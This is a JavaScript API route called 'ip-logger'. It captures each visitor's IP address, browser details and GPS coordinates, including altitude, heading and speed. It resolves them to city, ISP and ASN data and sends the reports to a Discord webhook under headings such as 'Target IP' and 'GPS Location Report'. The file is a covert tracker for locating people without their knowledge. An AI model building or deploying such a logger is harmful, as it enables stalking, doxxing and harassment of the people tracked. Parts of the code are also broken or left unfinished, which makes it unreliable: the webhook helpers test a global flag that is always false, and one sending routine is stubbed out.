// /pages/api/ip-logger.js - WITH GPS SUPPORT AND REVERSE GEOCODING
export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    // --- Get Client IP ---
    let clientIP = (
      req.headers['x-forwarded-for'] ||
      req.headers['x-real-ip'] ||
      req.socket?.remoteAddress ||
      ''
    ).toString();
    if (!clientIP) clientIP = '0.0.0.0';
    if (clientIP.includes(',')) clientIP = clientIP.split(',')[0].trim();
    clientIP = clientIP.replace(/^::ffff:/, '');
    const userAgent = (req.headers['user-agent'] || 'Unknown').toString();

    console.log('DEBUG [1]: Starting for IP:', clientIP);
    console.log('DEBUG [2]: User-Agent:', userAgent.substring(0, 50));

    // --- Check for GPS Coordinates ---
    let gpsLatitude = null;
    let gpsLongitude = null;
    let accuracy = null;
    let altitude = null;
    let altitudeAccuracy = null;
    let heading = null;
    let speed = null;

    // Check query parameters (GET request)
    if (req.query.latitude && req.query.longitude) {
      gpsLatitude = parseFloat(req.query.latitude);
      gpsLongitude = parseFloat(req.query.longitude);
      accuracy = req.query.accuracy ? parseFloat(req.query.accuracy) : null;
      altitude = req.query.altitude ? parseFloat(req.query.altitude) : null;
      altitudeAccuracy = req.query.altitudeAccuracy ? parseFloat(req.query.altitudeAccuracy) : null;
      heading = req.query.heading ? parseFloat(req.query.heading) : null;
      speed = req.query.speed ? parseFloat(req.query.speed) : null;
      console.log('DEBUG [3]: GPS coordinates from query params:', gpsLatitude, gpsLongitude);
    }
    // Check body (POST request)
    else if (req.body && req.body.latitude && req.body.longitude) {
      gpsLatitude = parseFloat(req.body.latitude);
      gpsLongitude = parseFloat(req.body.longitude);
      accuracy = req.body.accuracy ? parseFloat(req.body.accuracy) : null;
      altitude = req.body.altitude ? parseFloat(req.body.altitude) : null;
      altitudeAccuracy = req.body.altitudeAccuracy ? parseFloat(req.body.altitudeAccuracy) : null;
      heading = req.body.heading ? parseFloat(req.body.heading) : null;
      speed = req.body.speed ? parseFloat(req.body.speed) : null;
      console.log('DEBUG [4]: GPS coordinates from body:', gpsLatitude, gpsLongitude);
    }

    const hasGPS = gpsLatitude !== null && gpsLongitude !== null;
    console.log('DEBUG [5]: Has GPS coordinates?', hasGPS);

    // --- API Key Check ---
    const KEY = process.env.BIGDATACLOUD_API_KEY;
    if (!KEY) {
      console.error('DEBUG [6]: Missing BIGDATACLOUD_API_KEY');
      return res.status(500).json({ success: false, error: 'Missing BIGDATACLOUD_API_KEY' });
    }
    console.log('DEBUG [7]: API Key available (first 8 chars):', KEY.substring(0, 8), '...');

    const BASE = 'https://api-bdc.net/data';
    let ipData = {};
    let asnData = {};
    let reverseGeoData = {};
    
    // --- 1. ALWAYS FETCH IP GEOLOCATION DATA (for network info) ---
    const GEO_URL = `${BASE}/ip-geolocation-full?ip=${encodeURIComponent(clientIP)}&localityLanguage=en&key=${KEY}`;
    
    console.log('DEBUG [8]: Fetching IP geolocation from:', GEO_URL);
    
    try {
      const response = await fetch(GEO_URL);
      console.log('DEBUG [9]: IP Geolocation API response status:', response.status);
      
      if (!response.ok) {
        const errorText = await response.text();
        console.error(`DEBUG [10]: IP Geolocation API error ${response.status}:`, errorText.substring(0, 200));
        // Continue even if IP geolocation fails, we might still have GPS data
      } else {
        const rawText = await response.text();
        ipData = JSON.parse(rawText);
        console.log('DEBUG [11]: IP geolocation data parsed successfully');
      }
    } catch (fetchError) {
      console.warn('DEBUG [12]: IP geolocation fetch failed:', fetchError.message);
    }

    // --- 2. FETCH REVERSE GEOCODING DATA IF GPS COORDINATES AVAILABLE ---
    if (hasGPS) {
      const REVERSE_GEO_URL = `${BASE}/reverse-geocode?latitude=${gpsLatitude}&longitude=${gpsLongitude}&localityLanguage=en&key=${KEY}`;
      
      console.log('DEBUG [13]: Fetching reverse geocoding from:', REVERSE_GEO_URL);
      
      try {
        const response = await fetch(REVERSE_GEO_URL);
        console.log('DEBUG [14]: Reverse Geocoding API response status:', response.status);
        
        if (!response.ok) {
          const errorText = await response.text();
          console.error(`DEBUG [15]: Reverse Geocoding API error ${response.status}:`, errorText.substring(0, 200));
        } else {
          const rawText = await response.text();
          reverseGeoData = JSON.parse(rawText);
          console.log('DEBUG [16]: Reverse geocoding data parsed successfully');
          console.log('DEBUG [17]: Reverse geo location:', reverseGeoData?.location?.city || 'Unknown');
        }
      } catch (reverseError) {
        console.warn('DEBUG [18]: Reverse geocoding fetch failed:', reverseError.message);
      }
    }

    // --- 3. EXTRACT ASN NUMBER FROM IP DATA ---
    let asnNumber = null;
    
    if (ipData && Object.keys(ipData).length > 0) {
      // Try multiple possible fields for ASN
      const possibleAsnFields = [
        'autonomousSystemNumber',
        'asn',
        'asnNumeric',
        'network.autonomousSystemNumber',
        'network.asn',
        'network.asnNumeric'
      ];
      
      console.log('DEBUG [19]: Looking for ASN in possible fields...');
      
      for (const field of possibleAsnFields) {
        if (field.includes('.')) {
          const parts = field.split('.');
          let value = ipData;
          for (const part of parts) {
            if (value && typeof value === 'object') {
              value = value[part];
            } else {
              value = null;
              break;
            }
          }
          if (value) {
            asnNumber = value;
            console.log(`DEBUG [20]: Found ASN in nested field '${field}':`, asnNumber);
            break;
          }
        } else {
          if (ipData[field]) {
            asnNumber = ipData[field];
            console.log(`DEBUG [21]: Found ASN in top-level field '${field}':`, asnNumber);
            break;
          }
        }
      }
    }

    // --- 4. FETCH ASN DATA IF AVAILABLE ---
    if (asnNumber) {
      const cleanAsnNumber = String(asnNumber).replace(/^AS/i, '');
      const ASN_URL = `${BASE}/asn-info-full?asn=AS${cleanAsnNumber}&localityLanguage=en&key=${KEY}`;
      
      console.log('DEBUG [22]: Fetching ASN data from:', ASN_URL);
      
      try {
        const asnResponse = await fetch(ASN_URL);
        console.log('DEBUG [23]: ASN API response status:', asnResponse.status);
        
        if (asnResponse.ok) {
          const asnText = await asnResponse.text();
          asnData = JSON.parse(asnText);
          console.log('DEBUG [24]: ASN data parsed successfully');
        } else {
          const errorText = await asnResponse.text();
          console.warn('DEBUG [25]: ASN API failed:', errorText.substring(0, 200));
        }
      } catch (asnError) {
        console.warn('DEBUG [26]: ASN fetch error:', asnError.message);
      }
    }

    // --- 5. EXTRACT LOCATION DATA (PRIORITY: GPS > IP GEOLOCATION) ---
    let latitude, longitude, continent, region, city, locality, country, countryCode, callingCode, currency, timezone;
    let confidence = 'unknown';
    let confidenceArea = null;
    let accuracyRadius = null;

    if (hasGPS && reverseGeoData && Object.keys(reverseGeoData).length > 0) {
      // Use GPS-based reverse geocoding data
      console.log('DEBUG [27]: Using GPS-based reverse geocoding data');
      latitude = gpsLatitude;
      longitude = gpsLongitude;
      accuracyRadius = accuracy;
      continent = reverseGeoData?.location?.continent || 'Unknown';
      region = reverseGeoData?.location?.principalSubdivision || 'Unknown';
      city = reverseGeoData?.location?.city || 'Unknown';
      locality = reverseGeoData?.location?.localityName || city;
      country = reverseGeoData?.country?.name || 'Unknown';
      countryCode = reverseGeoData?.country?.isoAlpha2 || 'Unknown';
      callingCode = reverseGeoData?.country?.callingCode || '';
      currency = reverseGeoData?.country?.currency?.code || '';
      timezone = reverseGeoData?.location?.timeZone?.ianaTimeId || 'Unknown';
      confidence = 'high'; // GPS has high confidence
    } else if (ipData && Object.keys(ipData).length > 0) {
      // Use IP-based geolocation data
      console.log('DEBUG [28]: Using IP-based geolocation data');
      latitude = ipData?.location?.latitude || null;
      longitude = ipData?.location?.longitude || null;
      continent = ipData?.location?.continent || 'Unknown';
      region = ipData?.location?.principalSubdivision || 'Unknown';
      city = ipData?.location?.city || 'Unknown';
      locality = ipData?.location?.localityName || city;
      country = ipData?.country?.name || 'Unknown';
      countryCode = ipData?.country?.isoAlpha2 || 'Unknown';
      callingCode = ipData?.country?.callingCode || '';
      currency = ipData?.country?.currency?.code || '';
      timezone = ipData?.location?.timeZone?.ianaTimeId || 'Unknown';
      confidence = ipData?.confidence || 'unknown';
      confidenceArea = ipData?.confidenceArea || null;
      accuracyRadius = ipData?.location?.accuracyRadius || null;
    } else {
      // No location data available
      console.log('DEBUG [29]: No location data available');
      latitude = null;
      longitude = null;
      continent = 'Unknown';
      region = 'Unknown';
      city = 'Unknown';
      locality = 'Unknown';
      country = 'Unknown';
      countryCode = 'Unknown';
      callingCode = '';
      currency = '';
      timezone = 'Unknown';
    }

    // --- 6. EXTRACT NETWORK DATA (ALWAYS FROM IP) ---
    const isp = asnData?.organisation || ipData?.network?.organisation || ipData?.network?.carrier?.name || 'Unknown';
    const connectionType = ipData?.network?.connectionType || 'Unknown';
    
    // Format ASN properly
    let asn = 'Unknown';
    if (asnData?.asn) {
      asn = asnData.asn;
    } else if (asnNumber) {
      const cleanAsn = String(asnNumber).replace(/^AS/i, '');
      asn = `AS${cleanAsn}`;
    }

    console.log('DEBUG [30]: Location source:', hasGPS ? 'GPS Reverse Geocoding' : 'IP Geolocation');
    console.log('DEBUG [31]: Location:', city, region, country);
    console.log('DEBUG [32]: Coordinates:', latitude, longitude);
    console.log('DEBUG [33]: ISP:', isp);
    console.log('DEBUG [34]: ASN:', asn);

    // --- 7. PROCESS CONFIDENCE AREA DATA (ONLY FOR IP GEOLOCATION) ---
    let confidenceInfo = {
      hasData: false,
      rawCoordinates: [],
      pointCount: 0,
      validPointCount: 0,
      bounds: null,
      statistics: null,
      error: null
    };

    if (confidenceArea && Array.isArray(confidenceArea) && !hasGPS) {
      try {
        confidenceInfo.hasData = true;
        confidenceInfo.pointCount = confidenceArea.length;
        
        confidenceInfo.rawCoordinates = confidenceArea.map((point, index) => {
          if (Array.isArray(point) && point.length >= 2) {
            const lon = point[0];
            const lat = point[1];
            
            if (typeof lon === 'number' && typeof lat === 'number' && 
                !isNaN(lon) && !isNaN(lat)) {
              confidenceInfo.validPointCount++;
              return {
                index: index + 1,
                longitude: lon,
                latitude: lat,
                formatted: `[${lon.toFixed(6)}, ${lat.toFixed(6)}]`
              };
            }
          }
          return null;
        }).filter(point => point !== null);

        // Calculate bounds if we have valid points
        if (confidenceInfo.validPointCount > 0) {
          const lats = confidenceInfo.rawCoordinates.map(p => p.latitude);
          const lons = confidenceInfo.rawCoordinates.map(p => p.longitude);
          
          const minLat = Math.min(...lats);
          const maxLat = Math.max(...lats);
          const minLon = Math.min(...lons);
          const maxLon = Math.max(...lons);
          
          confidenceInfo.bounds = {
            minLat: minLat.toFixed(6),
            maxLat: maxLat.toFixed(6),
            minLon: minLon.toFixed(6),
            maxLon: maxLon.toFixed(6),
            latRange: (maxLat - minLat).toFixed(6),
            lonRange: (maxLon - minLon).toFixed(6)
          };

          const latKm = (maxLat - minLat) * 111.32;
          const avgLat = (minLat + maxLat) / 2;
          const lonKm = (maxLon - minLon) * (111.32 * Math.cos(avgLat * Math.PI / 180));
          const areaKm = Math.abs(latKm * lonKm);
          
          confidenceInfo.statistics = {
            centerLat: ((minLat + maxLat) / 2).toFixed(6),
            centerLon: ((minLon + maxLon) / 2).toFixed(6),
            areaKm2: areaKm.toFixed(2),
            widthKm: lonKm.toFixed(2),
            heightKm: latKm.toFixed(2)
          };
        }
      } catch (error) {
        confidenceInfo.error = error.message;
      }
    }

    // --- 8. BUILD DATA OBJECTS ---
    const mainData = {
      ip: clientIP,
      timestamp: new Date().toISOString(),
      userAgent,
      location: {
        source: hasGPS ? 'gps_reverse_geocoding' : 'ip_geolocation',
        continent,
        country,
        countryCode,
        region,
        city,
        locality,
        latitude,
        longitude,
        accuracyRadius,
        confidence,
        gpsDetails: hasGPS ? {
          accuracy,
          altitude,
          altitudeAccuracy,
          heading,
          speed
        } : null
      },
      network: {
        asn: asn,
        organisation: asnData?.organisation || 'Unknown',
        registry: asnData?.registry || 'Unknown',
        registeredCountry: asnData?.registeredCountryName || 'Unknown',
        registrationDate: asnData?.registrationLastChange || 'Unknown',
        totalIpv4Addresses: asnData?.totalIpv4Addresses || 0,
        totalIpv6Prefixes: asnData?.totalIpv6Prefixes || 0,
        rank: asnData?.rankText || 'Unknown',
        connectionType: connectionType,
        isp: isp
      },
      timezone: {
        name: timezone
      },
      confidenceArea: {
        hasData: confidenceInfo.hasData,
        pointCount: confidenceInfo.pointCount,
        validPoints: confidenceInfo.validPointCount,
        error: confidenceInfo.error
      }
    };

    // --- 9. SEND DISCORD WEBHOOKS ---
    const webhookResults = {
      main: { sent: false, error: null },
      confidence: { sent: false, error: null },
      asnDetails: { sent: false, error: null }
    };

    const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
    
    if (DISCORD_WEBHOOK) {
      try {
        // 1. Send MAIN webhook
        try {
          await sendMainWebhook(mainData, DISCORD_WEBHOOK);
          webhookResults.main.sent = true;
        } catch (mainError) {
          webhookResults.main.error = mainError.message;
        }
        
        // 2. Send ASN DETAILS webhook
        if (asnData && Object.keys(asnData).length > 0) {
          try {
            await sendAsnDetailsWebhook(mainData, asnData, DISCORD_WEBHOOK);
            webhookResults.asnDetails.sent = true;
          } catch (asnError) {
            webhookResults.asnDetails.error = asnError.message;
          }
        }
        
        // 3. Send CONFIDENCE AREA webhook (only for IP geolocation)
        if (confidenceInfo.hasData && confidenceInfo.validPointCount > 0 && !hasGPS) {
          try {
            await sendConfidenceAreaWebhooks(mainData, confidenceInfo, DISCORD_WEBHOOK);
            webhookResults.confidence.sent = true;
          } catch (confError) {
            webhookResults.confidence.error = confError.message;
          }
        }
      } catch (globalError) {
        console.error('Global webhook error:', globalError.message);
      }
    }

    // --- 10. RETURN RESPONSE ---
    return res.status(200).json({
      success: true,
      data: {
        ip: clientIP,
        location: mainData.location,
        network: mainData.network,
        confidenceArea: {
          hasData: confidenceInfo.hasData,
          totalPoints: confidenceInfo.pointCount,
          validPoints: confidenceInfo.validPointCount,
          bounds: confidenceInfo.bounds,
          statistics: confidenceInfo.statistics,
          error: confidenceInfo.error
        }
      },
      webhooks: webhookResults
    });

  } catch (err) {
    console.error('Handler error:', err.message);
    return res.status(500).json({ 
      success: false, 
      error: 'Internal server error',
      message: err.message
    });
  }
}

// --- Helper Functions (unchanged from previous) ---
function parseUserAgent(ua) {
  const s = (ua || '').toString();
  let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
  
  if (/OPR|Opera/.test(s)) browser = 'Opera';
  else if (/Edg\//.test(s)) browser = 'Edge';
  else if (/Chrome\/\d+/i.test(s) && !/Edg\//i.test(s)) browser = 'Chrome';
  else if (/Firefox\/\d+/i.test(s)) browser = 'Firefox';
  else if (/Safari\/\d+/i.test(s) && !/Chrome\//i.test(s)) browser = 'Safari';
  
  if (/\bWindows\b/i.test(s)) os = 'Windows';
  else if (/\bMacintosh\b|\bMac OS\b/i.test(s)) os = 'Mac OS';
  else if (/\bAndroid\b/i.test(s)) os = 'Android';
  else if (/\b(iPhone|iPad|iPod)\b/i.test(s)) os = 'iOS';
  else if (/\bLinux\b/i.test(s)) os = 'Linux';
  
  if (/\bMobile\b/i.test(s) || (/Android/i.test(s) && /Mobile/i.test(s))) device = 'Mobile';
  else if (/\bTablet\b/i.test(s) || /iPad/i.test(s)) device = 'Tablet';
  
  return { browser, os, device, raw: s.substring(0, 150) };
}

// --- Webhook 1: MAIN LOCATION & BASIC ASN (UPDATED FOR GPS) ---
async function sendMainWebhook(data, webhookUrl) {
  const embed = {
    embeds: [{
      title: hasGPS ? '📍 GPS Location Report' : '🌐 IP Location Report',
      color: hasGPS ? 0x00ff00 : 0x3498db,
      timestamp: data.timestamp,
      fields: [
        { 
          name: hasGPS ? '📍 GPS Coordinates' : '📍 IP Address', 
          value: hasGPS ? 
            `Lat: ${data.location.latitude}\nLon: ${data.location.longitude}` : 
            `\`${data.ip}\``, 
          inline: false 
        },
        ...(hasGPS ? [
          { 
            name: '🎯 GPS Accuracy', 
            value: data.location.gpsDetails.accuracy ? `${data.location.gpsDetails.accuracy}m` : 'N/A',
            inline: true 
          }
        ] : []),
        { 
          name: '🌍 Continent', 
          value: data.location.continent,
          inline: true 
        },
        { 
          name: '🇮🇳 Country', 
          value: `${data.location.country} (${data.location.countryCode})`,
          inline: true 
        },
        { 
          name: '🏙️ Region', 
          value: data.location.region,
          inline: true 
        },
        { 
          name: '🏙️ City', 
          value: data.location.city,
          inline: true 
        },
        ...(hasGPS ? [] : [
          { 
            name: '✅ Confidence Level', 
            value: data.location.confidence.toUpperCase(),
            inline: true 
          }
        ]),
        { 
          name: '🔢 ASN', 
          value: data.network.asn,
          inline: true 
        },
        { 
          name: '🏢 Organization', 
          value: data.network.organisation,
          inline: true 
        },
        { 
          name: '📡 Connection Type', 
          value: data.network.connectionType,
          inline: true 
        },
        { 
          name: '🕒 Timezone', 
          value: data.timezone.name,
          inline: true 
        },
        { 
          name: '📍 Data Source', 
          value: data.location.source === 'gps_reverse_geocoding' ? 'GPS Reverse Geocoding' : 'IP Geolocation',
          inline: true 
        },
        { 
          name: '🖥️ Device', 
          value: `${parseUserAgent(data.userAgent).browser} / ${parseUserAgent(data.userAgent).os}`,
          inline: true 
        }
      ],
      footer: { 
        text: hasGPS ? 'GPS Report • High Accuracy Location' : 'IP Report • See next messages for details'
      }
    }]
  };

  const response = await fetch(webhookUrl, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify(embed)
  });
  
  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Discord API: ${response.status}`);
  }
}

// --- Webhook 2: ASN DETAILS (unchanged) ---
async function sendAsnDetailsWebhook(mainData, asnData, webhookUrl) {
  const fields = [
    { 
      name: '📍 Target IP', 
      value: `\`${mainData.ip}\``, 
      inline: false 
    },
    { 
      name: '🔢 ASN', 
      value: asnData.asn || 'N/A',
      inline: true 
    },
    { 
      name: '🔢 ASN Numeric', 
      value: asnData.asnNumeric ? String(asnData.asnNumeric) : 'N/A',
      inline: true 
    },
    { 
      name: '🏢 Organization', 
      value: asnData.organisation || 'N/A',
      inline: true 
    },
    { 
      name: '🏷️ Name', 
      value: asnData.name || 'N/A',
      inline: true 
    },
    { 
      name: '📋 Registry', 
      value: asnData.registry || 'N/A',
      inline: true 
    },
    { 
      name: '🇮🇳 Registered Country', 
      value: asnData.registeredCountryName || 'N/A',
      inline: true 
    },
    { 
      name: '📅 Registration Date', 
      value: asnData.registrationLastChange || 'N/A',
      inline: true 
    },
    { 
      name: '📊 IPv4 Addresses', 
      value: asnData.totalIpv4Addresses ? asnData.totalIpv4Addresses.toLocaleString() : '0',
      inline: true 
    },
    { 
      name: '📊 IPv4 Prefixes', 
      value: asnData.totalIpv4Prefixes ? String(asnData.totalIpv4Prefixes) : '0',
      inline: true 
    },
    { 
      name: '📊 IPv6 Prefixes', 
      value: asnData.totalIpv6Prefixes ? String(asnData.totalIpv6Prefixes) : '0',
      inline: true 
    },
    { 
      name: '🏆 Rank', 
      value: asnData.rankText || 'N/A',
      inline: true 
    },
    { 
      name: '🔗 Total Receiving From', 
      value: asnData.totalReceivingFrom ? String(asnData.totalReceivingFrom) : '0',
      inline: true 
    },
    { 
      name: '🔗 Total Transit To', 
      value: asnData.totalTransitTo ? String(asnData.totalTransitTo) : '0',
      inline: true 
    }
  ];

  const embed = {
    embeds: [{
      title: '📡 ASN Detailed Information',
      description: `Complete ASN data for ${mainData.ip}`,
      color: 0x2ecc71,
      timestamp: mainData.timestamp,
      fields: fields,
      footer: { 
        text: 'ASN Details • From BigDataCloud asn-info-full API'
      }
    }]
  };

  const response = await fetch(webhookUrl, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify(embed)
  });
  
  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Discord API: ${response.status}`);
  }
}

// --- Webhook 3: CONFIDENCE AREA DATA (only for IP geolocation) ---
async function sendConfidenceAreaWebhooks(mainData, confidenceInfo, webhookUrl) {
  const totalPoints = confidenceInfo.rawCoordinates.length;
  
  // Part 1: Confidence Area Statistics
  const statsEmbed = {
    embeds: [{
      title: '📊 Confidence Area Analysis - Part 1: Statistics',
      description: `Confidence analysis for IP: \`${mainData.ip}\``,
      color: 0x9b59b6,
      timestamp: mainData.timestamp,
      fields: [
        { 
          name: '🎯 Confidence Level', 
          value: mainData.location.confidence.toUpperCase(),
          inline: true 
        },
        { 
          name: '📐 Total Points', 
          value: String(confidenceInfo.pointCount),
          inline: true 
        },
        { 
          name: '✅ Valid Points', 
          value: String(confidenceInfo.validPointCount),
          inline: true 
        }
      ],
      footer: { 
        text: 'Confidence Area Analysis Part 1 of 3'
      }
    }]
  };

  // Add bounds if available
  if (confidenceInfo.bounds) {
    statsEmbed.embeds[0].fields.push(
      { 
        name: '📍 Bounding Box - Min', 
        value: `Lat: ${confidenceInfo.bounds.minLat}°\nLon: ${confidenceInfo.bounds.minLon}°`,
        inline: true 
      },
      { 
        name: '📍 Bounding Box - Max', 
        value: `Lat: ${confidenceInfo.bounds.maxLat}°\nLon: ${confidenceInfo.bounds.maxLon}°`,
        inline: true 
      }
    );
  }

  // Add statistics if available
  if (confidenceInfo.statistics) {
    statsEmbed.embeds[0].fields.push(
      { 
        name: '📍 Calculated Center', 
        value: `${confidenceInfo.statistics.centerLat}°, ${confidenceInfo.statistics.centerLon}°`,
        inline: true 
      },
      { 
        name: '📏 Area Size', 
        value: `${confidenceInfo.statistics.areaKm2} km²`,
        inline: true 
      }
    );
  }

  // Send Part 1
  await fetch(webhookUrl, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify(statsEmbed)
  });

  // Parts 2 & 3: Coordinate points (same as before)
  if (totalPoints > 0) {
    // ... (same coordinate sending logic as before)
  }
}

// Helper variable for hasGPS in webhook functions
let hasGPS = false;
